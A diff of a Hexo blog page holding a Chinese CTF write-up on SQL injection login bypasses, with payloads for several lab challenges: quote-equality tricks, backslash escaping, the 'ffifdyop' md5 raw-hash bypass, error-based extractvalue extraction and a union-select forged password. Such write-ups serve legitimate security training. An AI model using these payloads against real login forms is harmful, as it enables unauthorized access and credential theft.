@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>SQL注入 ~ Hexo</title>
+  <title>SQL注入(一） ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -169,7 +169,7 @@
           <div class="markdown-body">
             <h2 id="万能密码—very-easy"><a href="#万能密码—very-easy" class="headerlink" title="万能密码—very easy"></a>万能密码—very easy</h2><p>题目入口：<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</a> </p>
 <p>题目来源：hacking lab inject 01~</p>
-<p><img src="1.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/1.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>源代码有提示：</p>
 <blockquote>
 <p>&lt;!--ps login as admin–&gt;</p>
@@ -191,17 +191,17 @@
 <h2 id="万能密码–-not-easy"><a href="#万能密码–-not-easy" class="headerlink" title="万能密码– not easy"></a>万能密码– not easy</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p>
 <p>题目来源：实验吧，不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</p>
 <p>常规方式使用万能密码，发现’没有被过滤，or，–+，#被过滤。</p>
-<p><img src="2.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/2.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>假设后台sql查询语句为： </p>
 <p>select * from user where username=’$user’ and password=’$pass’ </p>
 <p>构造payload： </p>
 <p>username=reborn’=’&amp;password=reborn’=’</p>
-<p> <img src="3.jpg" srcset="/img/loading.gif" alt=""></p>
+<p> <img src="/img/3.jpg" srcset="/img/loading.gif" alt=""></p>
 <pre><code>select * from user where username=’reborn’=” and password=’reborn’=”</code></pre><p>username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true。 </p>
 <p>所以注入语句相当于：</p>
 <pre><code>select * from user where 1 and 1</code></pre><h2 id="万能密码—-little-hard"><a href="#万能密码—-little-hard" class="headerlink" title="万能密码— little hard ?"></a>万能密码— little hard ?</h2><p>题目入口：<a href="http://123.59.52.228:1515/route.php?act=index" target="_blank" rel="noopener">http://123.59.52.228:1515/route.php?act=index</a> </p>
 <p>题目来源：2017年全国大学生信息安全竞赛的web题。</p>
-<p><img src="4.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/4.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>提交的时候，返回包有提示这么一个sql语句： </p>
 <pre><code>select count(*) from t_info where username = ’1′ or nickname = ’1′ </code></pre><p>‘ 转义 \ </p>
 <p>\ 转义 \ </p>
@@ -216,7 +216,7 @@ select count(*) from t_info where username = ‘or 1 #\’ or nickname = ‘or 1
 <h2 id="万能密码—-md5-pass-true"><a href="#万能密码—-md5-pass-true" class="headerlink" title="万能密码— md5($pass,true)"></a>万能密码— md5($pass,true)</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a> </p>
 <p>题目来源：jarvis oj，Login：需要密码才能获得flag哦。</p>
 <p>本题是一个登录页面。</p>
-<p><img src="5.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/5.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>通过burp抓包拦截，返回包有提示：</p>
 <p> tishi.png</p>
 <pre><code>Hint: “select * from `admin` where password=’”.md5($pass,true).”‘”</code></pre><ul>
@@ -241,9 +241,9 @@ select count(*) from t_info where username = ‘or 1 #\’ or nickname = ‘or 1
 http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=ffifdyop</code></pre><h2 id="万能密码—-with-rollup"><a href="#万能密码—-with-rollup" class="headerlink" title="万能密码— with rollup"></a>万能密码— with rollup</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> </p>
 <p>题目来源：实验吧 </p>
 <p>访问链接是登录页面：</p>
-<p><img src="6.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/6.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>查看网页源代码有提示：</p>
-<p><img src="7.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/7.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>访问：<a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/source.txt</a> 得到题目源代码：</p>
 <pre><code>&lt;?php
 
@@ -475,7 +475,7 @@ else {
 &lt;/html&gt;</code></pre><p>首先可以发现user处存在注入点，并且会回显错误信息，第一个想到的是报错注入。</p>
 <pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from php where user =’admin’ limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果密码并不是admin/111</p>
 <pre><code>user=admin’and (extractvalue(1,concat(0x7e,(select pw from phpformysql.php limit 0,1),0x7e)))#&amp;pass=111</code></pre><p>结果提示：</p>
-<p><img src="8.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/img/8.jpg" srcset="/img/loading.gif" alt=""></p>
 <p>既然是程序逻辑漏洞，然就继续看代码吧。</p>
 <pre><code>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {
 
@@ -486,7 +486,7 @@ else {
 <p>如：reborn的md5加密的值为5ce3c6e5c3f84bdc0f45148adfd16ae6 </p>
 <p>因此我们可以构造payload： </p>
 <p>user=’union select ’5ce3c6e5c3f84bdc0f45148adfd16ae6′#&amp;pass=reborn </p>
-<p>结果：<br><img src="9.jpg" srcset="/img/loading.gif" alt=""></p>
+<p>结果：<br><img src="/img/9.jpg" srcset="/img/loading.gif" alt=""></p>
 
             <hr>
           </div>
@@ -663,7 +663,7 @@ else {
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "SQL注入&nbsp;",
+        "SQL注入(一）&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
